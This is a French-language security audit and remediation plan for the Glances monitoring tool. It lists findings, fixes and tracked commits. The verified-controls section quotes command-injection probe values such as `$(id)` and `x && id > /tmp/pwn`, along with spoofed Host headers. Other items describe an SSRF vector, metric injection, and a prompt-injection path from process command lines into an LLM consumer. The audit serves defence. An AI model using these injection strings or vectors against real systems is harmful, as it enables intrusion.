| B-17 / R-3 | Un serveur malveillant arrête le client sans le dire (JSON profond → `RecursionError`, jeton non-dict → `AttributeError`, 200 non-JSON → `JSONDecodeError`, tous hors `RemoteError`) ; 100 Kio gzip → 201 Mio en mémoire (prouvé). | `client.py:138,157,170,344-357`, `main.py:1521-1525` | `stream=True` + plafond 32 Mio + délai total ; toute exception de lecture → `NotAGlancesServer` ; `poll_once` attrape `Exception`. |
| B-18 | Navigateur : `_levels: [1]` ou `"x"` d'un serveur fait sauter le tour, le serveur sain suivant reste `UNKNOWN` (prouvé) ; corps distillé octet par octet jamais expiré. | `servers_list.py:147-160,204-251` | `except Exception` par serveur ; délai total. |
| B-19 | Adresses Zeroconf acceptées telles quelles (`127.0.0.1`, `169.254.169.254`, `224.0.0.1`, `0.0.0.0` : prouvé) et sans plafond (5 000 entrées) ; avec `-s --browser`, `/api/5/serverslist` sert le statut → SSRF aveugle et sonde de ports. | `zeroconf.py:160-172` | Refuser loopback, link-local, multicast, non spécifiée, broadcast ; plafond 256 (`MAX_SERVERS` existe pour les entrées statiques seulement). |
| B-20 | Graphite/StatsD : retour à la ligne dans un nom injecte des métriques (datagramme prouvé) ; Prometheus : `eth0,src:spoofed` écrase un label, `a,b` fait perdre le cycle du plugin. | `glances_graphite/export.py:32-34,75`, `glances_statsd/export.py:31-33,64`, `glances_prometheus/export.py:115-134` | Liste blanche `[A-Za-z0-9_.-]` ; labels Prometheus construits en dict. |
| R-4 | M10 : la valeur est découpée sur `,` **avant** la redaction : `https://bob:pa,ss@h/` exporté `https://bob:pa ss@…`. | `export_base.py:382,469-480` | Appliquer `_URL_CREDENTIALS_RE` à la valeur entière avant le découpage. |
| R-6 | URL RabbitMQ construite sans percent-encoding : un mot de passe avec `@ / # ? %` est mal lu et les fragments apparaissent dans l'erreur journalisée. | `glances_rabbitmq/export.py:65,69` | `quote(user, safe="")`/`quote(password, safe="")` comme CouchDB, ou `ConnectionParameters`. |
| I-11 | Exporteurs sans TLS ou sans vérification par défaut : CouchDB `http://` seul, Kafka sans SSL/SASL, ClickHouse sans `secure`, TimescaleDB `sslmode=prefer`, Cassandra sans `ssl_context`, MQTT livré `port=8883` + `tls=false`, ZeroMQ `host=*`. | voir audit 2026-10-04 | Clés optionnelles ; corriger la configuration livrée MQTT/ZeroMQ. |
| I-12 | NATS : `redact('nats://user:p@ss@host')` → `nats://ss@host`, serveur sans schéma non redacté ; restful journalise l'URL complète en INFO. | `glances_nats/export.py:52-54`, `glances_restful/export.py:54` | Réutiliser `_URL_CREDENTIALS_RE`. |
| X-1 | Un étage de pipeline qui ne se lance pas (`cat … \| grp` : binaire absent) laisse l'étage amont tourner : un processus root orphelin par cycle d'alerte (prouvé : `sleep 12345` survivant). | `secure.py:129-135` | `try/except BaseException` autour de la boucle de spawn : `kill()` + `wait()` des étages lancés. |
| folders | 1 100 dossiers imbriqués → `RecursionError`, plugin hors service à chaque cycle (prouvé) ; tout utilisateur pouvant `mkdir` sous un dossier surveillé le déclenche. | `globals.py:531-552` | Parcours itératif borné (`scandir` + pile, ensemble d'inodes visités). |
| podman | Socket Podman par défaut = celui de l'uid 1000 : root fait confiance au JSON d'un utilisateur. | `plugins/containers/model.py:35,163-167` | Par défaut `/run/podman/podman.sock` en root, `$XDG_RUNTIME_DIR` sinon. |
| W-3 | Mot de passe non ASCII : accepté par la WebUI, refusé par `/api/5/token` (`HTTPBasic` décode en ASCII) donc par `glances -c`. Échec fermé, mais pousse l'opérateur à retirer le mot de passe. | `routes.py:87,219-251` | Remplacer `HTTPBasic` par le décodeur partagé (avec B-1). |
| W-6 | WebUI : `?refresh=0.001` fait sonder un onglet en boucle (limite générale off). | `static/js/refresh.js:143-144`, `AppShell.vue:820` | Borner à `[1, 60]` comme les boutons du pied de page. |
| S-4 | Dépendances installées sans vérification de hachage (`--no-hashes` dans les quatre fichiers, pas de `--require-hashes`, `uv.lock` ignoré) ; les fichiers dérivent (`jsonschema`, `sse-starlette`, `tomli` à des versions différentes selon l'image). | `requirements*.txt:2`, Dockerfiles, `snapcraft.yaml:80-81`, `.gitignore` | Générer avec hachages, `--require-hashes`, committer `uv.lock`, régénérer d'un coup. |
| S-5 | Aucune mise à jour automatique pour `pip` ni les images de base Docker (Dependabot : actions + npm seulement ; `renovate.json` désactivé). | `.github/dependabot.yml:3-17`, `renovate.json:6` | Ajouter les écosystèmes `pip` et `docker` (8 lignes) ; supprimer `renovate.json`. |
| S-6 | Scan de sécurité CI non bloquant et étroit : Trivy `CRITICAL` seulement, `ignore-unfixed`, `continue-on-error: true`, `develop` uniquement ; pas de `pip-audit`/`bandit`/`npm audit` en CI. | `cyber.yml:9,23-29`, `ci.yml:53` | Retirer `continue-on-error`, `CRITICAL,HIGH`, ajouter `pip-audit -r all-requirements.txt --no-deps` (20 s), sur les PR. |
| S-7 | Aucune provenance/signature des artefacts : `attestations: false` alors que la permission est accordée ; image Docker sans `provenance`/`sbom`/cosign. | `build.yml:59,85`, `build_docker.yml:101-116` | `attestations: true` ; `provenance: mode=max`, `sbom: true`. |
| S-8 | La CI pousse le bundle WebUI compilé sur `develop` (`contents: write`) : une compromission de la chaîne npm atterrit seule ; reproductibilité non vérifiée. | `webui.yml:14,42-49` | Remplacer la poussée par `git diff --exit-code glances/outputs/static/public` ; `contents: read`. |
| S-9 | Snap : `source-branch: develop` (pas de tag), `version: '5.0.0+build00'` (bêta annoncée comme finale) ; plugs `power-control`, `uio`, `raw-volume`, `log-observe` sans consommateur, `proc-sys` doublon de `system-observe`. | `snapcraft.yaml:7,32-54,70-79` | `source-tag: v5.0.0b1`, version corrigée, retirer les cinq plugs. |
| S-13 | `pip-audit` : `ecdsa 0.19.2` (CVE-2024-23342, pas de correctif) et `python-jose 3.5.0` (CVE-2026-85394) dans `docker-` et `all-requirements.txt`. Non exploitables ici : HS256 + secret symétrique épinglés (`security.py:130-141`). | `docker-requirements.txt:32,96` | Passer à PyJWT (déjà dépendance transitive de `mcp`) : trois lignes, retire `ecdsa`/`rsa`/`pyasn1`. |

### 2.3 Info

- **I-1** (doc) §8 décrit encore `shlex.quote`/`create_subprocess_shell`/
  `allow_shell()` et des tests `*_v5` disparus (`glances-v5-architecture-decisions.md:828,1080,1098-1100`).
  Réel : rendu après tokenisation (`secure.py:61-73`), tests
  `test_action_shell.py:117,137`.
- **I-4** Hash stocké non ASCII → `TypeError` dans `compare_digest` → 500 sur
  chaque Basic et sur `/api/5/token` (prouvé `abcd$café`) ; hash sans `$` →
  401 silencieux. Valider au démarrage.
- **I-5** `webui_allowed_hosts` défini : `/status` et `/healthz` filtrés aussi
  (sondes Kubernetes par IP → 400) ; comparaison sensible à la casse
  (`GLANCES.EXAMPLE.COM` → 400) — W-8 : mettre la liste en minuscules.
- **I-6** `/api/5/token` exempté pour toutes les méthodes (sans effet).
- **I-7** Code mort : `RateLimitMiddleware._reserve_auth_try`
  (`ratelimit.py:137-138`) ; `system_exec` (`globals.py:160`) ; `uninstall.sh`
  (exige un `setup.py` absent, S-15).
- **I-9** MCP : lignes de commande des processus dans les prompts (injection
  de prompt vers le consommateur LLM) ; aucun outil MCP, rien ne s'exécute.
- **I-10** `GLANCES_<SECTION>__<KEY>` peut tout changer, y compris
  `OUTPUTS__PASSWORD`, `AUTH_FAIL_PER_MINUTE=0`, `<plugin>__CRITICAL_ACTION`
  (prouvé) ; l'env passe **après** le fichier, donc
  `GLANCES_GLOBAL__DISABLE_CONFIG_EXEC=false` annule un fichier qui le met à
  vrai (le drapeau CLI gagne toujours). Même principal ; à documenter.
- **I-14** Déni de service bon marché : limite générale off, `/all` et
  `/history` recopient tout à chaque appel, `nb` sans plafond. Levier :
  `rate_limit_per_minute`.
- **W-4** Host étranger sur MCP SSE : 421 puis `ValueError` du SDK remonte
  jusqu'à uvicorn (une trace par requête). Bruit de journal.
- **W-5** MCP : défaut `localhost,127.0.0.1` sans `[::1]`, et `[::1]` doit
  s'écrire `[::1]:*` ; comparaison sensible à la casse.
- **W-9** En-tête `Server: uvicorn` (passer `server_header=False`).
- **W-10** `uvicorn` sans plancher dans `pyproject.toml:110`, donc `h11` non
  plus (smuggling derrière un proxy avec h11 < 0.16) : `uvicorn>=0.34`.
- **W-11** Avec mot de passe, `/api/5/config` sert toujours les secrets de
  valeur (`amp_db.command`, `cpu.critical_action`) : rôle unique, acceptable,
  à écrire dans `docs/config.rst:196-200`.
- **R-2 / R-7** voir A3. **R-8** CSV/JSON : `open()` suit les liens, JSON
  réécrit non atomiquement (chemin choisi par l'opérateur).
- **X-3** `globals.py:84-88` pousse `amps/`, `plugins/`, `exports/` du paquet
  sur `sys.path[1]` : `import cpu`, `import system`, `import default`
  résolvent dans Glances et masquent des modules tiers homonymes. Code mort
  (constantes sans lecteur) ; contredit « pas de modification de `sys.path` »
  du précédent audit. Supprimer, et tester que l'import de `glances` laisse
  `sys.path` intact.
- **X-5** AMP par défaut : `e.output` sur une exception qui ne l'a pas
  (`AttributeError` à chaque rafraîchissement) ; une virgule dans `command=`
  en fait une liste.
- **X-6** Tokenizer : une suite de ≥ 2 espaces ou une tabulation devient un
  argument (`['  ', 'a', '\t', 'b']`) : `if not _.isspace()`.
- **X-7** `{{var}}` HTML-échappe la valeur (`a&b` → `a&amp;b`) ; les exemples
  livrés utilisent tous `{{var}}` ; `{{{var}}}` absent de `docs/aoa/actions.rst`.
- **X-9** Partials Mustache `{{> name}}` lisent `./name.mustache` dans le CWD
  du démon : `partials_dict={}`.
- **X-10** nl80211 (commit `7f6ec6b`, revu à neuf) : parsing borné, délai,
  socket fermé, erreurs noyau tolérées ; ne vérifie pas `seq`/`pid` de la
  réponse (robustesse, pas de frontière : unicast netlink exige
  `CAP_NET_ADMIN`).
- **X-11** Enfants de `secure_popen` : héritent de stdin et de tout
  l'environnement (`GLANCES_*`, `LOG_CFG`) : `stdin=DEVNULL`.
- **S-14** Paquets non maintenus dans `all` : `wifi 0.3.8` (2016, tire
  `pbkdf2 1.3` et `setuptools` à l'exécution), `bernhard`, `potsdb`,
  `graphitesender` ; `fastapi>=0.82.0` (2022).
- **S-16** Outils périmés : `chartboost/ruff-action` (archivé, épinglé par SHA
  donc sûr, plus de bumps), `appveyor.yml` 3.10–3.12, `sonar-project.properties`
  4.0, compose code en dur `/run/user/1000/podman/podman.sock`.
- **S-17** `docs/_static/glances-flame.html` charge jsDelivr sans SRI (9,3 Mo
  de `docs/_static` dans le sdist).
- **S-18** Pas de chart Helm dans le dépôt alors que CLAUDE.md le cite.

### 2.4 Vérifié et sain

- **Authentification :** PBKDF2 hors boucle asyncio, comparaison à temps
  constant, clé éphémère `token_urlsafe(32)`, `alg=none`/HS512/mauvaise clé/
  expiré/`iss` absent/`sub` non chaîne → 401 ; Basic avec `:` dans le mot de
  passe → 200 ; `basic` minuscule, charge non UTF-8, `Bearer` vide, en-tête de
  8 Ko → 401 en un seul PBKDF2 ; `HEAD`/`OPTIONS`/`/openapi.json`/`/mcp/sse`
  → 401 sans identifiants.
- **TrustedHost loopback :** `localhost.evil.example`, `evil.example:localhost`,
  `localhost.`, `127.1`, `::1` nu → 400 ; `[::1]:61208` → 200.
- **Routes :** 500 génériques (`debug=False`) ; `[passwords]` jamais sérialisé ;
  `/api/5/config` sans mot de passe = quatre clés même avec secrets configurés.
- **MCP :** 401 sans identifiants, 421 Host étranger, 403 Origin étranger, le
  point de montage ne peut pas masquer une route.
- **WebUI :** ni `v-html`, ni `innerHTML`, ni `eval` (sources et bundle) ; CSP
  meta stricte + `referrer same-origin` ; `localStorage` = `glances.refresh`
  seul ; aucun identifiant côté client ; `serverHref` limité à http(s) sans
  identifiant ; une seule dépendance d'exécution (`vue 3.5.42`), 489 paquets
  du lock tous avec `integrity` et depuis `registry.npmjs.org`, overrides
  CVE actifs.
- **Exécution de commandes :** tokeniser puis rendre confine toute valeur à un
  argument (prouvé avec `x && id > /tmp/pwn | cat`, backticks, `$(id)`, liste,
  dict) ; opérateurs découpés avant rendu ; `--disable-config-exec` garde les
  opérateurs littéraux dans tous les modes ; pool de 4 + dédoublonnage ; un AMP
  en vol ; timeout qui tue et récolte ; `systemd` en liste d'arguments ; regex
  AMP compilée une fois, invalide → AMP désactivé.
- **Primitives dangereuses (tout `glances/`) :** ni `pickle`, `marshal`,
  `yaml.load`, `eval`, `exec`, `shell=True`, `os.system`, `os.popen`, `mktemp`,
  `0o777` ; `subprocess` seulement dans `secure.py`, `virsh.py` (liste),
  `ports/scanner.py` (`ping` en liste), systemd AMP ; `tempfile` seulement dans
  `graph` (`mkstemp` + rename).
- **Plugins :** `ip` (schéma, pré-contrôle DNS, épinglage à la connexion,
  `Authorization` retirée hors origine, `allow_internal` opt-in) ; `ports` (TLS
  vérifié, `ssl_verify` par URL, identifiants et proxys hors payload, délai par
  socket) ; `vms`, `containers` (URL redactées), `cloud` (URL fixes, 3 s),
  `smart`/`raid` (dégradent à vide), GPU/NPU (`glob` sur racines fixes,
  `open()` dans `try`), TUI (C0/DEL remplacés).
- **Client et navigateur :** `Authorization` retirée sur redirection vers un
  autre hôte (prouvé), jamais d'identifiant dans une URL, `[passwords]` jamais
  envoyé à un serveur découvert, `-c` vérifie TLS par défaut, aucun processus
  exporté par défaut en `-c --export`.
- **Exporteurs :** TimescaleDB/DuckDB/Cassandra/ClickHouse (hors `insert`)
  identifiants cités ou filtrés ; MQTT `tls=true` vérifie (certifi,
  `CERT_REQUIRED`), topics en liste blanche ; CouchDB/Mongo/ClickHouse masquent
  les identifiants dans les erreurs ; isolation par plugin dans
  `export_base.update()` ; CSV via le module `csv` ; Prometheus échoue fermé
  par plugin.
- **CI/CD :** 20 actions tierces épinglées par SHA complet, aucun tag flottant ;
  pas de `pull_request_target` ; aucune injection de script (données
  d'événement via `env:`) ; `permissions: {}` au sommet, blocs minimaux par
  job ; PyPI par OIDC (trusted publishing) sans jeton stocké ; login Docker
  conditionnel ; CodeQL js+python sur chaque PR ; aucun secret dans l'arbre
  (gitleaks + detect-private-key en pre-commit) ; `.dockerignore` en liste
  blanche ; compose `read_only`, `privileged: false`, tmpfs.
- **Journaux et fichiers :** M7 et M8 confirmés (plus aucun repli sur `/tmp`,
  0700/0600) ; `pip-audit` propre sur `requirements.txt` et
  `dev-requirements.txt`.

**Non vérifié :** un ClickHouse, un InfluxDB, un carbon/statsd réels (seuls
les octets émis ont été capturés) ; un MITM réel contre A6 ; la
reproductibilité du bundle `public/glances.js` (pas de `npm ci` exécuté) ;
`npm audit` ; un slowloris contre uvicorn ; la branche `support/glancesv4`
(absente du clone).

---

## Plan d'action

Chaque ligne : effort (XS < 1 h, S < ½ j, M ≤ 1 j, L > 1 j), aucune nouvelle
clé obligatoire, test de non-régression attendu avec la correction. Les
constats identiques en v4 sont marqués `v4` pour report sur `support/glancesv4`.

### Vague 1 — avant `5.0.0rc1` (≈ 1,5 jour, un seul PR par ligne)

| # | Action | Constats | Effort |
|---|---|---|---|
| 1 | `glances_clickhouse/export.py:189` : `insert(table=table, …)` ; `remote_plugins()` n'accepte que `^[a-z][a-z0-9_]{0,63}$` hors sections réservées ; test sur l'argument `table=` | A3 (R-1, R-2, R-7) | XS |
| 2 | `uvicorn.Config(..., proxy_headers=False, server_header=False)` ; clé optionnelle `[outputs] forwarded_allow_ips` ; corriger `ratelimit.py:34` ; test avec `X-Forwarded-For` | A1 (B-6), W-9 | S |
| 3 | `CapacityLimiter(2)` autour de `verify_password` ; éviction des seaux : jamais un seau `tokens < 1` | A1 (W-2, B-7) | S |
| 4 | `jwt_secret_key` : refuser l'exemple et < 32 octets → clé éphémère + WARNING ; `require_exp`, `sub == username`, plafond 1440 min ; nouvel exemple dans `conf/glances.conf` | A2 (B-2, I-2) | S |
| 5 | `-C` absent → exit 2 | A10 (B-8) | XS |
| 6 | `openapi_url=None` quand `api_doc=false` | W-1 | XS |
| 7 | hddtemp : `settimeout(2)`, plafond 64 Kio, `finally` corrigé ; `disable=True` dans la conf livrée | A5 (M6) | XS |
| 8 | `secure_popen` : kill/wait des étages lancés quand un spawn échoue ; `stdin=DEVNULL` ; `isspace()` | X-1, X-11, X-6 | XS |
| 9 | `SECURITY.md` réécrit (5.x / 4.5.x / canal privé / délai) ; `ISSUE_TEMPLATE/config.yml` ; `GHSA-TODO` résolu ; quatre lignes au §8 et au miroir ; case « §8 synchronisé » dans la checklist de release | A8 (S-1, S-12) | S |
| 10 | Dependabot `pip` + `docker` ; `cyber.yml` bloquant (`CRITICAL,HIGH`, sans `continue-on-error`, sur PR) + `pip-audit` ; `attestations: true`, `provenance`/`sbom` Docker | S-5, S-6, S-7 | S |
| 11 | Docker : `apt-get upgrade` dans `base`, `HEALTHCHECK`, commentaires `bind_address`/`network_mode`/`:ro`, `-p 61208:61208` pour la variante web | A9 (S-2, S-3) | S |
| 12 | Doc : §8 (I-1), `docs/config.rst` (W-11, I-10 : l'env atteint `password`), `docs/aoa/actions.rst` (`{{{var}}}`, `--`, exemples hors `/tmp`) | I-1, X-4, X-7, X-8 | S |

### Vague 2 — avant `5.0.0` (≈ 3 jours)

| # | Action | Constats | Effort |
|---|---|---|---|
| 13 | `decode_basic()` partagé dans `security.py` : sans court-circuit, hash factice, UTF-8 ; remplace `HTTPBasic` dans `routes.py` ; validation du hash stocké au démarrage | B-1, W-3, I-4 | S |
| 14 | Middleware d'en-têtes (`nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`) + 403 sur POST cross-site (`Sec-Fetch-Site`/`Origin`) | B-5 | S |
| 15 | Nouveau format de hachage `pbkdf2_sha256$iter$salt$hash`, `dklen=32`, ancien format lu | A1 (B-3) | S |
| 16 | `secure.py` : refuser `/`, `..`, NUL dans une cible **rendue**, `O_NOFOLLOW`, support de `>>` | A4 (M5, X-4) | S |
| 17 | InfluxDB 1/2 : vérification TLS par défaut, clé `ssl_verify` ; test | A6 (M9), `v4` | XS |
| 18 | Zeroconf : filtre d'adresses + plafond 256 ; affichage `alias (zeroconf <ip>)` TUI + WebUI ; adresse dans l'invite ; alias en conflit avec une entrée statique refusé ; avertissement de clair visible | A7 (M11, B-19, I-13) | M |
| 19 | `client.py` : plafond 32 Mio en flux, délai total, toute exception de lecture → `NotAGlancesServer`, `poll_once`/`poll_server` attrapent `Exception` | B-17, B-18, R-3 | S |
| 20 | Helper « fichier de confiance en root » (propriétaire, mode) appliqué à la config utilisateur, au dossier de journal (`O_NOFOLLOW`, `fchmod` conditionnel) et à `LOG_CFG` | B-9, X-2, I-10, S-10, `v4` | S |
| 21 | `ip` : gestionnaires explicites, schéma vérifié dans `redirect_request` | B-14 | XS |
| 22 | `stdout`/`fetch` : filtre C0/DEL/C1, module `csv` ; CSV exporteur : préfixe `'` ; `SandboxedEnvironment` ; `_REDACT_FIELDS` complété + avertissements filtrés | B-15, R-5, I-8, B-16, `v4` | S |
| 23 | `folder_size` itératif borné ; socket Podman par défaut selon l'uid | folders, podman | S |
| 24 | Graphite/StatsD liste blanche, Prometheus labels en dict ; `_without_url_secrets` avant le découpage ; RabbitMQ percent-encoding ; NATS/restful redaction | B-20, R-4, R-6, I-12, `v4` | S |
| 25 | `/api/5/args` en liste blanche des drapeaux lus par la WebUI | B-12 | XS |
| 26 | Hachages des dépendances (`--require-hashes`, `uv.lock` committé) ; `webui.yml` en `diff --exit-code` + `contents: read` ; Snap (`source-tag`, version, plugs) ; `FROM` par digest | S-4, S-8, S-9, S-3 | M |
| 27 | Supprimer `globals.py:84-88` (+ test `sys.path` intact), `system_exec`, `_reserve_auth_try`, `uninstall.sh` | X-3, I-7, S-15 | XS |
| 28 | Performance sur machine représentative (checklist) et report des constats `v4` sur `support/glancesv4` | — | M |

### Vague 3 — après `5.0.0`

| # | Action | Constats |
|---|---|---|
| 29 | Swagger/ReDoc servis localement via webpack, ou `api_doc` off hors loopback | B-11 |
| 30 | Clés TLS optionnelles pour Kafka, ClickHouse, TimescaleDB, Cassandra, CouchDB ; conf MQTT/ZeroMQ cohérente | I-11 |
| 31 | PyJWT à la place de python-jose ; `uvicorn>=0.34` ; remplacer `wifi 0.3.8` | S-13, W-10, S-14 |
| 32 | WebUI `?refresh` borné ; MCP `[::1]` + casse ; `ValueError` SSE avalée ; AMP `e.output` ; nl80211 `seq` | W-6, W-5, W-4, X-5, X-10 |
| 33 | `webui_allowed_hosts` insensible à la casse, sondes `/status`/`/healthz` hors filtre | W-8, I-5 |

### Garde-fous de processus

- Une case « §8 et `SKILL-security.md` synchronisés avec les avis publiés »
  dans la checklist de chaque release (c'est l'action du plan qui a été
  oubliée).
- Chaque constat corrigé reçoit un test nommé d'après son identifiant
  (`test_insert_table_is_quoted_r1`, `test_missing_config_file_is_fatal_b8`) :
  l'absence de tests est ce qui a laissé M5, M6, B-14 et B-19 reproductibles
  treize jours après leur publication.
- Un sous-dossier `tests/security/` qui regroupe ces tests et tourne en
  premier dans `ci.yml`.

---

## Suivi des corrections — vague 1 (2026-10-23)

| # | Constats | État | Commit |
|---|---|---|---|
| 1 | A3 (R-1, R-2, R-7) | **Corrigé** : `insert(table=table)` cité ; `remote_plugins()` n'accepte que `[a-z][a-z0-9_]{0,63}` hors sections réservées et exporteurs. Tests `test_clickhouse_insert_gets_the_quoted_table_name`, `test_remote_plugins_refuse_names_that_are_not_plugin_names`. | `ba5ead4` |
| 2 | A1 (B-6), W-9 | **Corrigé** : `proxy_headers=False`, `server_header=False` ; clé optionnelle `[outputs] forwarded_allow_ips`. | `77365b7` |
| 3 | A1 (W-2, B-7) | **Corrigé** : `verify_password_in_thread()` sous `CapacityLimiter(2)` ; l'éviction épargne les seaux verrouillés. | `2576eb6` |
| 4 | A2 (B-2, I-2) | **Corrigé** : clé d'exemple ou < 32 octets refusée (clé éphémère + WARNING), `require_exp`/`require_iat`, `sub == username`, plafond 1440 min ; nouvel exemple dans `conf/glances.conf`. | `2576eb6` |
| 5 | A10 (B-8) | **Corrigé** : `-C` absent → `ConfigFileError`, exit 2. | `5afb2f1` |
| 6 | W-1 | **Corrigé** : `openapi_url=None` avec `api_doc=false`. | `5afb2f1` |
| 7 | A5 (M6) | **Corrigé** : `settimeout(2)`, plafond 64 Kio. La conf livrée garde `disable=False` (aucun changement de comportement : après un délai dépassé, le plugin ne réinterroge plus le démon). | `5afb2f1` |
| 8 | X-1, X-6, X-11 | **Corrigé** : étages lancés tués si un spawn échoue, `stdin=DEVNULL`, `isspace()`. | `02e727d` |
| 9 | A8 (S-1, S-12) | **Corrigé** : `SECURITY.md`, `ISSUE_TEMPLATE/config.yml`, §8 + miroir synchronisés au 2026-10-23, alias CVE, case de checklist. La synchronisation a révélé **six** avis absents, pas quatre : s'ajoutent GHSA-vg43-q6xr-hp92 (corrigé en v5 : TUI et WebUI masquent `public_info_human` avec l'adresse) et GHSA-48jj-p764-8x75 (couvert par le plugin `ip` v5, résidu B-14). **Reste :** le `GHSA-TODO` de `NEWS.rst:247` (4.5.7, « credentials leaked through the published plugin limits ») n'a pas d'avis publié correspondant distinct de GHSA-5344 ; à trancher par le mainteneur. | `6a3ea78` |
| 10 | S-5, S-6, S-7 | **Corrigé** : Dependabot `pip` + `docker`, `renovate.json` supprimé ; Trivy bloquant `CRITICAL,HIGH` sur les PR, job `pip-audit` ; `attestations: true`, `provenance: mode=max`, `sbom: true`. | `d049c7a` |
| 11 | A9 (S-2, S-3) | **Corrigé** : `apt-get upgrade` dans `base`, `HEALTHCHECK` dans les deux images, commentaires compose/conf/README. Non fait (décision produit) : `USER glances`, `FROM` par digest (vague 2). | `d049c7a` |
| 12 | I-1, X-4, X-7, X-8, W-11, I-10 | **Corrigé** : §8 décrit le mécanisme réel ; exemples d'actions sous `/var/log/glances`, règles `{{{var}}}`, `--`, un seul `>` ; `docs/config.rst` complété. | `6a3ea78`, `d049c7a` |

Suite de tests après la vague 1 : voir le message de la session (exécutée
avant la poussée).
